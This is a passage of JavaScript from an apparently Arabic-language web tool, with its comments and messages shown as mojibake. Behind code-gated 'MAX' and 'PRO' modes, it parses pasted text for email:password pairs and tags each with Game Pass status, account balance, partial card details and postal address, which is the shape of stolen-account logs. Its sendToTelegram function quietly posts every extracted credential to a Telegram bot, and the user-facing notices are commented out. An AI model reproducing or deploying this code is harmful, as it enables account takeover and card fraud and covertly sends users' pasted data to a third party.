        const newCode = document.getElementById("new-code").value.trim();
        // ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø§Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø§Ù„Ù…Ø¯Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©
        
        if (!newCode) return showToast("Ø£Ø¯Ø®Ù„ ÙƒÙˆØ¯ ØµØ§Ù„Ø­");

        let codes = getCodes();
        if (codes.find(c => c.code === newCode)) return showToast("Ø§Ù„ÙƒÙˆØ¯ Ù…ÙˆØ¬ÙˆØ¯ Ù…Ø³Ø¨Ù‚Ø§Ù‹");
        
        let isPermanent = true; // Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ø¯Ø§Ø¦Ù…ÙŠ
        let expiry = null;      // Ù„Ø§ ÙŠÙˆØ¬Ø¯ ØªØ§Ø±ÙŠØ® Ø§Ù†ØªÙ‡Ø§Ø¡

        // ÙŠÙ…ÙƒÙ† ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø­Ø¯ Ø§Ù„Ø£Ù‚ØµÙ‰ Ù‡Ù†Ø§ Ø¥Ø°Ø§ Ø£Ø±Ø¯ØªØŒ ØªÙ… Ø²ÙŠØ§Ø¯ØªÙ‡ ÙƒÙ…Ø«Ø§Ù„
        if (codes.filter(c => c.isPermanent).length >= 40) {
             return showToast("Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¥Ø¶Ø§ÙØ© Ø£ÙƒØ«Ø± Ù…Ù† 40 ÙƒÙˆØ¯ Ø¯Ø§Ø¦Ù…ÙŠ.");
        }
        
        codes.push({ code: newCode, expiry: expiry, isPermanent: isPermanent, creationDate: Date.now() });
        saveCodes(codes);
        loadCodes();
        document.getElementById("new-code").value = '';
        showToast(`ØªÙ… Ø¥Ø¶Ø§ÙØ© Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¯Ø§Ø¦Ù…ÙŠ: ${newCode}`);
    }

    function deleteCode(codeToDelete) {
        let codes = getCodes();
        codes = codes.filter(c => c.code !== codeToDelete);
        saveCodes(codes);
        loadCodes();
        showToast(`ØªÙ… Ù…Ø³Ø­ Ø§Ù„ÙƒÙˆØ¯: ${codeToDelete}`);
    }

    function clearExpiredCodes() {
        let codes = getCodes();
        const beforeCount = codes.length;
        // ÙŠØªÙ… Ù…Ø³Ø­ Ø£ÙŠ ÙƒÙˆØ¯ Ù„ÙŠØ³ Ø¯Ø§Ø¦Ù…ÙŠØ§Ù‹ (ØªØ­Ø³Ø¨Ø§Ù‹ Ù„ÙˆØ¬ÙˆØ¯ Ø£ÙƒÙˆØ§Ø¯ Ù‚Ø¯ÙŠÙ…Ø© Ù…Ø¤Ù‚ØªØ©)
        codes = codes.filter(c => c.isPermanent);
        const removedCount = beforeCount - codes.length;
        saveCodes(codes);
        loadCodes();
        showToast(`ØªÙ… Ù…Ø³Ø­ ${removedCount} Ø£ÙƒÙˆØ§Ø¯ ØºÙŠØ± Ø¯Ø§Ø¦Ù…Ø©.`);
    }

    function loadCodes() {
        const codes = getCodes();
        const listDiv = document.getElementById("code-list-display");
        listDiv.innerHTML = "";

        if (codes.length === 0) {
            listDiv.innerHTML = `<div style="text-align:center; color:#888;">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£ÙƒÙˆØ§Ø¯ Ø­Ø§Ù„ÙŠØ§Ù‹.</div>`;
            return;
        }

        codes.forEach(c => {
            const item = document.createElement("div");
            item.className = "code-item";
            
            const info = document.createElement("span");
            info.className = "code-info";
            
            // Ø§Ù„ÙƒÙˆØ¯Ø§Øª Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ø¯Ø§Ø¦Ù…ÙŠØ© Ø¨Ø¹Ø¯ Ø§Ù„ØªØ¹Ø¯ÙŠÙ„
            let status = "Ø¯Ø§Ø¦Ù…ÙŠ âœ…";
            let color = '#00cc00';

            info.innerHTML = `Ø§Ù„ÙƒÙˆØ¯: <b>${c.code}</b> | Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ©: <span style="color:${color};">${status}</span>`;
            
            const deleteBtn = document.createElement("button");
            deleteBtn.className = "delete-btn";
            deleteBtn.textContent = "Ø­Ø°Ù";
            deleteBtn.onclick = () => deleteCode(c.code);
            
            item.appendChild(info);
            item.appendChild(deleteBtn);
            listDiv.appendChild(item);
        });
    }

    // **********************************************
    // ** ÙˆØ¸Ø§Ø¦Ù Ø§Ù„ØªÙ†Ù‚Ù„ ÙˆØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ **
    // **********************************************
    
    function promptAdminLogin() {
         dropdownMenu.classList.add('hidden');
         
         // 1. Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„ÙØ¹Ø§Ù„ Ù‡Ùˆ ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ù…Ù†ØŒ Ø§Ø°Ù‡Ø¨ Ù…Ø¨Ø§Ø´Ø±Ø©
         if (activeCodeInfo && activeCodeInfo.code === ADMIN_CODE) {
             return navigateTo('admin');
         }
         
         // 2. Ù†Ø±Ø¬Ø¹ Ù„ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ ÙˆÙ†Ø·Ù„Ø¨ Ø±Ù…Ø² Ø§Ù„Ø£Ø¯Ù…Ù† 
         navigateTo('login');
         
         // 3. Ù…Ø³Ø­ Ø£ÙŠ Ù…Ø­ØªÙˆÙ‰ Ø³Ø§Ø¨Ù‚ ÙˆØªØ¬Ù‡ÙŠØ² Ø§Ù„Ø­Ù‚Ù„ Ù„Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„Ø£Ø¯Ù…Ù† 
         codeInput.value = ''; 
         errorMsg.textContent = "Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù…Ø² Ø§Ù„Ø£Ø¯Ù…Ù† Ù„Ù„Ø¯Ø®ÙˆÙ„ Ù„Ù„ÙˆØ­Ø© Ø§Ù„Ø¥Ø¯Ø§Ø±Ø©:";
         showToast("Ø£Ø¯Ø®Ù„ Ø±Ù…Ø² Ø§Ù„Ø£Ø¯Ù…Ù†.");
         
         // 4. ØªØºÙŠÙŠØ± onclick Ù…Ø¤Ù‚ØªØ§Ù‹ Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø±Ù…Ø² Ø§Ù„Ø£Ø¯Ù…Ù† ÙÙ‚Ø·
         submitBtn.onclick = handleAdminCodeSubmit;
    }
    
    // Ø¯Ø§Ù„Ø© Ø®Ø§ØµØ© Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø±Ù…Ø² Ø§Ù„Ø£Ø¯Ù…Ù† Ø¨Ø¹Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± Ø§Ù„Ø¯Ø®ÙˆÙ„
    function handleAdminCodeSubmit() {
        const code = codeInput.value.trim();
        errorMsg.textContent = "";

        if (code === ADMIN_CODE) {
            // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø²Ø± Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„ÙˆØ¸ÙŠÙØªÙ‡ Ø§Ù„Ø£ØµÙ„ÙŠØ© 
            submitBtn.onclick = handleLogin;
            activeCodeInfo = { code: ADMIN_CODE, isPermanent: true }; 
            navigateTo('admin');
            showToast("ØªÙ… Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„Ø¥Ø¯Ø§Ø±Ø©.");
        } else {
            errorMsg.textContent = "Ø±Ù…Ø² Ø§Ù„Ø£Ø¯Ù…Ù† ØºÙŠØ± ØµØ­ÙŠØ­.";
            activeCodeInfo = null; 
        }
        codeInput.value = '';
    }
    
    function switchTool(tool) {
        currentTool = tool;
        if (tool === 'max') {
            maxToolView.classList.remove('hidden');
            proToolView.classList.add('hidden');
            currentToolName.textContent = 'PRO'; 
            showToast("ØªÙ… Ø§Ù„ØªØ¨Ø¯ÙŠÙ„ Ø¥Ù„Ù‰ Ø£Ø¯Ø§Ø© MAX Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠØ©");
        } else if (tool === 'pro') {
            maxToolView.classList.add('hidden');
            proToolView.classList.remove('hidden');
            currentToolName.textContent = 'MAX'; 
            showToast("ØªÙ… Ø§Ù„ØªØ¨Ø¯ÙŠÙ„ Ø¥Ù„Ù‰ Ø£Ø¯Ø§Ø© PRO Ø§Ù„Ù…ÙØ­Ø³ÙÙ‘Ù†Ø©");
        }
        dropdownMenu.classList.add('hidden');
    }
    
    menuSwitchTool.onclick = () => {
        const nextTool = (currentTool === 'max') ? 'pro' : 'max';
        switchTool(nextTool);
    };

    menuButton.onclick = (e) => {
        e.stopPropagation();
        dropdownMenu.classList.toggle('hidden');
    };
    
    document.addEventListener('click', (e) => {
        if (!menuContainer.contains(e.target)) {
            dropdownMenu.classList.add('hidden');
        }
    });


    function updateCodeStatus() {
        // Ø¨Ù…Ø§ Ø£Ù† Ø§Ù„ÙƒÙˆØ¯Ø§Øª Ø¯Ø§Ø¦Ù…Ø©ØŒ Ù†Ø¹Ø±Ø¶ Ø­Ø§Ù„Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø·
        if (!activeCodeInfo) {
            codeStatusDisplay.textContent = 'âŒ Ù„Ø§ ÙŠÙˆØ¬Ø¯ ÙƒÙˆØ¯ ÙØ¹Ø§Ù„';
            return;
        }

        if (activeCodeInfo.code === ADMIN_CODE) {
             codeStatusDisplay.textContent = `ÙˆØ¶Ø¹ Ø§Ù„Ø£Ø¯Ù…Ù† âš™ï¸`;
        } else {
             codeStatusDisplay.textContent = `Ø§Ù„ÙƒÙˆØ¯ ğŸ—ï¸ ${activeCodeInfo.code}: Ø¯Ø§Ø¦Ù…ÙŠ âœ…`;
        }
    }

    function navigateTo(pageId) {
        loginPage.classList.add('hidden');
        toolPage.classList.add('hidden');
        adminPage.classList.add('hidden');
        
        // Ø§Ù„Ø£Ù…Ø§Ù†: Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø¥Ø¹Ø§Ø¯Ø© Ø²Ø± Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„Ù„ÙˆØ¶Ø¹ Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠ Ø¹Ù†Ø¯ Ù…ØºØ§Ø¯Ø±Ø© ØµÙØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù†
        if (pageId === 'login' && submitBtn.onclick === handleAdminCodeSubmit) {
             submitBtn.onclick = handleLogin;
        }

        if (pageId === 'tool') {
            toolPage.classList.remove('hidden');
            switchTool(currentTool); 
            updateCodeStatus(); 

        } else if (pageId === 'admin') {
            adminPage.classList.remove('hidden');
            loadCodes();
        } else {
            loginPage.classList.remove('hidden');
            errorMsg.textContent = ""; // Ù…Ø³Ø­ Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£ Ø§Ù„Ø£Ø¯Ù…Ù† Ø¥Ø°Ø§ ÙˆØ¬Ø¯Øª
        }
    }

    // Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ø£ØµÙ„ÙŠØ© Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø¹Ø§Ø¯ÙŠ Ø£Ùˆ ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ù…Ù†
    function handleLogin() {
        const code = codeInput.value.trim();
        errorMsg.textContent = "";

        if (code === ADMIN_CODE) {
            navigateTo('admin');
            activeCodeInfo = { code: ADMIN_CODE, isPermanent: true }; 
            showToast("ØªÙ… Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ù„ÙˆØ­Ø© Ø§Ù„Ø¥Ø¯Ø§Ø±Ø©.");
        } else if (isCodeValid(code)) {
            navigateTo('tool');
            showToast("ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø£Ø¯Ø§Ø© Ø¨Ù†Ø¬Ø§Ø­.");
        } else {
            errorMsg.textContent = "Ø±Ù…Ø² Ø¯Ø®ÙˆÙ„ ØºÙŠØ± ØµØ­ÙŠØ­.";
            activeCodeInfo = null; 
        }
        codeInput.value = '';
    }
    
    function logout() {
        activeCodeInfo = null;
        navigateTo('login');
        showToast("ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬.");
    }

    // **********************************************
    // ** ÙƒÙˆØ¯ Ø§Ù„Ø£Ø¯Ø§Ø© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ (Tool Core Logic) **
    // **********************************************
    
    function sendToTelegram(messageText) { 
        if (!BOT_TOKEN || !CHAT_ID) return console.error("Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø©.");
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const data = { chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' };

        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) })
        .then(response => response.json())
        .then(data => { 
            if (!data.ok) {
                const errorMsg = data.description || "Ø®Ø·Ø£ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
                console.error("Ø®Ø·Ø£ Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù…:", errorMsg);
                // âŒ ØªÙ… Ø­Ø°Ù Ø±Ø³Ø§Ù„Ø© ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù…Ù† Ø§Ù„Ù€ Toast Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø·Ù„Ø¨Ùƒ
                // showToast(`âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ${errorMsg}`); 
            } else {
                // âŒ ØªÙ… Ø­Ø°Ù Ø±Ø³Ø§Ù„Ø© Ù†Ø¬Ø§Ø­ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù…Ù† Ø§Ù„Ù€ Toast Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø·Ù„Ø¨Ùƒ
                // showToast("âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø¨Ù†Ø¬Ø§Ø­!");
            }
        })
        .catch(error => {
            console.error('Fetch Error:', error);
            // âŒ ØªÙ… Ø­Ø°Ù Ø±Ø³Ø§Ù„Ø© Ø®Ø·Ø£ Ø§Ù„Ø§ØªØµØ§Ù„ Ù…Ù† Ø§Ù„Ù€ Toast Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø·Ù„Ø¨Ùƒ
            // showToast(`âŒ Ø®Ø·Ø£ Ø§ØªØµØ§Ù„ Ø´Ø¨ÙƒØ©: ${error.message}`);
        });
    }

    function parseText(toolType) { 
        const inputElement = (toolType === 'max') ? inputMax : inputPro;
        const listElement = (toolType === 'max') ? listMax : listPro;
        
        const originalText = inputElement.value.trim();
        listElement.innerHTML = "";
        if (!originalText) return showToast("Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ù†Øµ Ù„Ù„Ù…Ø³Ø­");

        const lines = originalText.split('\n').filter(line => line.trim() !== '');
        const extractedPairs = []; 
        
        // ØªØ­Ø³ÙŠÙ† Ø§Ù„Ù€ regex Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±
        const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\-\| ]\s*([^\s,;'"<>()\[\]{}|\/\\]+)/g;
        // ØªÙ… ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…ÙØªØ§Ø­ÙŠØ© Ù„Ù€ GamePass
        const gamePassKeywords = /([(#=\-\[\]\s\/\!\@\&\*]|^)(ÙƒÙŠÙ…\s?Ø¨Ø§Ø³|Ù‚ÙŠÙ…\s?Ø¨Ø§Ø³|game\s?pass|gamepass|gpass|(xbox\s?(game\s?pass)?\s?ultimate)|Ø§Ù„ØªÙŠÙ…ÙŠØª|Ø¬ÙˆÙ„Ø¯|gold|pc\s?(game\s?pass)?|xbox|gpu|xgpu|Ø¨ÙŠØ³ÙŠ|ÙƒÙ…Ø¨ÙŠÙˆØªØ±|Ù…ÙØ¹Ù„|Ù†Ø´Ø·|active|months|years|Ø´Ù‡Ø±|Ø³Ù†Ø©|Ø³Ù†Ù‡|Ø§Ø´ØªØ±Ø§Ùƒ|gaming|mo(nths)?|yr(s)?|1y|Subscription\s*:\s*(Xbox|PC)\s*Game\s*Pass|Subscription\s*:\s*Xbox\s*Game\s*Pass\s*Ultimate|essential)/gi; 
        const priceRegex = /(price|credit|Ø±ØµÙŠØ¯|Ø¯ÙˆÙ„Ø§Ø±|usd|ÙƒØ±Ø¯Øª|ARS|GBP|TRY|CAD|BRL|MXN)\s*[:=\-]?\s*(\d+(\.\d{1,2})?)/gi;
        const cardInfoRegex = /CardInfo\s*=\s*\[CardHolder:\s*([^|]+)\s*\|\s*CC:\s*([^|]+)\s*\|\s*CC\s*expiryMonth:\s*(\d+)\s*\|\s*CC\s*ExpYear:\s*(\d+)\s*\|\s*CC\s*Last4Digit:\s*(\d{4})\s*\|\s*CC\s*Funding:\s*([^\]]+)\]/i;
        const userAddressRegex = /UserAddress\s*=\s*\[\s*Address:\s*([^,\]]+),\s*City:\s*([^,\]]+),\s*State:\s*([^,\]]+),\s*Postalcode:\s*([^\]]+)\]/i;

        for (const line of lines) {
            emailPwRegex.lastIndex = 0; priceRegex.lastIndex = 0;
            let match;
            
            if ((match = emailPwRegex.exec(line)) !== null) {
                const email = match[1].trim();
                const password = match[2].trim();
                const hasGamePass = gamePassKeywords.test(line);
                let priceMatch = priceRegex.exec(line);
                let extractedPrice = null;
                let cardDetails = null;
                let addressDetails = null;

                if (priceMatch) extractedPrice = priceMatch[2];
                
                if (toolType === 'pro') {
                    const cardMatch = cardInfoRegex.exec(line);
                    if (cardMatch) {
                        cardDetails = {
                            holder: cardMatch[1].trim(),
                            type: cardMatch[2].trim(),
                            month: cardMatch[3].trim(),
                            year: cardMatch[4].trim(),
                            last4: cardMatch[5].trim(),
                            funding: cardMatch[6].trim()
                        };
                    }
                    
                    const addressMatch = userAddressRegex.exec(line);
                    if (addressMatch) {
                        addressDetails = {
                            address: addressMatch[1].trim(),
                            city: addressMatch[2].trim(),
                            state: addressMatch[3].trim(),
                            zip: addressMatch[4].trim()
                        };
                    }
                }

                if (email && password.length > 0) {
                    extractedPairs.push([email, password, hasGamePass, extractedPrice, cardDetails, addressDetails]);
                }
            }
        }
        
        if (0 === extractedPairs.length) return showToast("Ù…Ø§ÙƒÙˆ Ù†ØªØ§Ø¦Ø¬ Ù…Ø·Ø§Ø¨Ù‚Ø©");

        // ØªØµÙÙŠØ© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ù…ÙƒØ±Ø±Ø© ÙˆØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù…ÙŠØ²Ø§Øª
        const uniqueResults = [];
        for (const [email, password, hasGP, price, card, address] of extractedPairs) {
            const key = email.toLowerCase() + ":" + password;
            const existingIndex = uniqueResults.findIndex(item => (item[0].toLowerCase() + ":" + item[1]) === key);

            if (existingIndex === -1) {
                uniqueResults.push([email, password, hasGP, price, card, address]);
            } else {
                const existingItem = uniqueResults[existingIndex];
                if (hasGP && !existingItem[2]) existingItem[2] = true; 
                if (price !== null && existingItem[3] === null) existingItem[3] = price;
                if (card !== null && existingItem[4] === null) existingItem[4] = card;
                if (address !== null && existingItem[5] === null) existingItem[5] = address;
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ù„Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù…
        if (uniqueResults.length > 0) {
            const telegramMessage = uniqueResults.map(([email, password, hasGP, price, card, address]) => {
                let text = `${email}:${password}`;
                if (hasGP) text += " | ÙƒÙŠÙ… Ø¨Ø§Ø³";
                if (price) text += ` | PRICE=$${price}`;
                if (card) text += ` | Card: ${card.type} (***${card.last4}, ${card.month}/${card.year})`;
                if (address) text += ` | Address: ${address.city}, ${address.state}`;
                return text;
            }).join('\n');
            
            const toolName = (toolType === 'max') ? "MAX" : "PRO";
            const header = `ğŸ‰ *Ù†ØªØ§Ø¦Ø¬ Ø£Ø¯Ø§Ø© ${toolName} Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©* ğŸ‰\nØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ ${uniqueResults.length} Ù†ØªÙŠØ¬Ø© ÙØ±ÙŠØ¯Ø©:\n\n\`\`\``;
            const footer = "\n\`\`\`\nØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ù…Ù† Ø§Ù„Ø£Ø¯Ø§Ø©.";
            sendToTelegram(header + telegramMessage + footer);
        }

        // Ø¨Ù†Ø§Ø¡ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ (Ø§Ù„Ø¹Ø±Ø¶ Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø§Ø´Ø©)
        uniqueResults.forEach(([email, password, hasGamePass, price, cardDetails, addressDetails]) => {
            const itemDiv = document.createElement("div");
            itemDiv.className = "item";
            
            const leftDiv = document.createElement("div");
            leftDiv.className = "left";
            const emailDiv = document.createElement("div");
            emailDiv.className = "email";
            emailDiv.textContent = email;
            const pwDiv = document.createElement("div");
            pwDiv.className = "pw";
            
            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯ ÙƒÙ†Øµ Ø¹Ø§Ø¯ÙŠ
            pwDiv.appendChild(document.createTextNode(password)); 
            
            // Ø§Ù„Ù…ÙŠØ²Ø§Øª: ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† Ø¶Ù…Ù† ÙˆØ³Ù… <span class="...-note">
            if (hasGamePass) {
                 const gpSpan = document.createElement("span");
                 gpSpan.className = "gamepass-note";
                 gpSpan.textContent = "ÙƒÙŠÙ… Ø¨Ø§Ø³";
                 pwDiv.appendChild(gpSpan); 
            }
            
            if (price !== null) {
                 const priceSpan = document.createElement("span");
                 priceSpan.className = "price-note";
                 priceSpan.textContent = `Ø±ØµÙŠØ¯ $${price}`; 
                 pwDiv.appendChild(priceSpan); 
            }
            
            if (toolType === 'pro' && cardDetails) {
                 const cardSpan = document.createElement("span");
                 cardSpan.className = "cc-note";
                 cardSpan.textContent = `ğŸ’³ ${cardDetails.type} | ****${cardDetails.last4} (${cardDetails.month}/${cardDetails.year})`; 
                 pwDiv.appendChild(cardSpan);
            }
            
            if (toolType === 'pro' && addressDetails) {
                 const addressSpan = document.createElement("span");
                 cardSpan.className = "cc-note address-note";
                 cardSpan.textContent = `ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${addressDetails.city}, ${addressDetails.state}, ${addressDetails.zip}`; 
                 pwDiv.appendChild(addressSpan);
            }

            leftDiv.appendChild(emailDiv);
            leftDiv.appendChild(pwDiv);
            
            const controlsDiv = document.createElement("div");
            controlsDiv.className = "controls";
            
            const copyEmailBtn = document.createElement("button");
            copyEmailBtn.className = "copy-btn btn-red";
            copyEmailBtn.textContent = "Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„";
            copyEmailBtn.onclick = async () => { await copyText(email) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„"); };
            
            const copyPwBtn = document.createElement("button");
            copyPwBtn.className = "copy-btn btn-black"; 
            copyPwBtn.textContent = "Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯";
            copyPwBtn.onclick = async () => { await copyText(password) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯"); };
            
            controlsDiv.appendChild(copyEmailBtn);
            controlsDiv.appendChild(copyPwBtn);
            
            itemDiv.appendChild(leftDiv);
            itemDiv.appendChild(controlsDiv);
            
            listElement.appendChild(itemDiv);
        });
        showToast(`ØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ ${uniqueResults.length} Ù†ØªÙŠØ¬Ø© ÙØ±ÙŠØ¯Ø©`)
    }
    
    // Ø¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ø±Ø¨Ø· ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ù†Ø³Ø® ÙˆØ§Ù„ØªÙ†Ø²ÙŠÙ„
    function setupCopyDownload(listElement, copyBtn, downloadBtn, toolName) { 
        copyBtn.onclick = async () => {
            const e = listElement.querySelectorAll(".item");
            if (!e.length) return void showToast("Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù„Ù†Ø³Ø®Ù‡Ø§");
            
            const t = [...e].map(e => { 
                const email = e.querySelector(".email").textContent.trim(); 
                const pwDiv = e.querySelector(".pw");
                // Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± ÙƒÙ†Øµ Ø¹Ø§Ø¯ÙŠØŒ ÙˆØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ù€ Spans
                const password = pwDiv.firstChild.textContent.trim(); 
                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note')].map(span => span.textContent.trim()).join(' | ');
                
                return email + ":" + password + (notes ? ` | ${notes}` : '');
            }).join("\n");
            
            await copyText(t) && showToast(`ØªÙ… Ù†Ø³Ø® ÙƒÙ„ Ù†ØªØ§Ø¦Ø¬ ${toolName}`);
        };
        
        downloadBtn.onclick = () => {
            const e = listElement.querySelectorAll(".item");
            if (!e.length) return void showToast("Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù„Ù„ØªÙ†Ø²ÙŠÙ„");
            
            const t = [...e].map(e => { 
                const email = e.querySelector(".email").textContent.trim(); 
                const pwDiv = e.querySelector(".pw");
                const password = pwDiv.firstChild.textContent.trim(); 
                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note')].map(span => span.textContent.trim()).join(' | ');

                return email + ":" + password + (notes ? ` | ${notes}` : ''); 
            }).join("\n");
            
            const o = new Blob([t], { type: "text/plain;charset=utf-8" }), n = URL.createObjectURL(o), c = document.createElement("a");
            c.href = n, c.download = `${toolName}_emails_passwords.txt`, c.click(), URL.revokeObjectURL(n), showToast("ØªÙ… ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù Ø¨Ù†Ø¬Ø§Ø­");
        };
    }

    // **********************************************
    // ** ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØµÙØ­Ø© Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„ **
    // **********************************************
    function initApp() {
        // ØªØ¹ÙŠÙŠÙ† Ø§Ù„ÙˆØ¸ÙŠÙØ© Ø§Ù„Ø£ØµÙ„ÙŠØ© Ù„Ø²Ø± Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ù„Ø£ÙˆÙ„ Ù…Ø±Ø©
        submitBtn.onclick = handleLogin;
        
        // Ø¥Ø¶Ø§ÙØ© ÙƒÙˆØ¯ (FR) Ø§Ù„Ø«Ø§Ø¨Øª Ø¥Ø°Ø§ Ù„Ù… ÙŠÙƒÙ† Ù…ÙˆØ¬ÙˆØ¯Ø§Ù‹
        let codes = getCodes();
        if (!codes.find(c => c.code === UNIVERSAL_CODE)) {
            // Ø¥Ø¶Ø§ÙØ© FR ÙƒÙƒÙˆØ¯ Ø¯Ø§Ø¦Ù…ÙŠ
            codes.push({ code: UNIVERSAL_CODE, expiry: null, isPermanent: true, creationDate: Date.now() });
            saveCodes(codes);
        }
        
        // Ø±Ø¨Ø· ÙˆØ¸Ø§Ø¦Ù Ø§Ù„ØªÙ†Ø¸ÙŠÙ ÙˆØ§Ù„Ù†Ø³Ø® ÙˆØ§Ù„ØªÙ†Ø²ÙŠÙ„ Ù„Ø£Ø¯Ø§Ø© MAX
        clearBtnMax.onclick = () => { inputMax.value = "", listMax.innerHTML = "", showToast("ØªÙ… Ù…Ø³Ø­ Ù…Ø­ØªÙˆÙ‰ Ø£Ø¯Ø§Ø© MAX"); };
        setupCopyDownload(listMax, copyAllBtnMax, downloadBtnMax, "MAX");
        
        // Ø±Ø¨Ø· ÙˆØ¸Ø§Ø¦Ù Ø§Ù„ØªÙ†Ø¸ÙŠÙ ÙˆØ§Ù„Ù†Ø³Ø® ÙˆØ§Ù„ØªÙ†Ø²ÙŠÙ„ Ù„Ø£Ø¯Ø§Ø© PRO
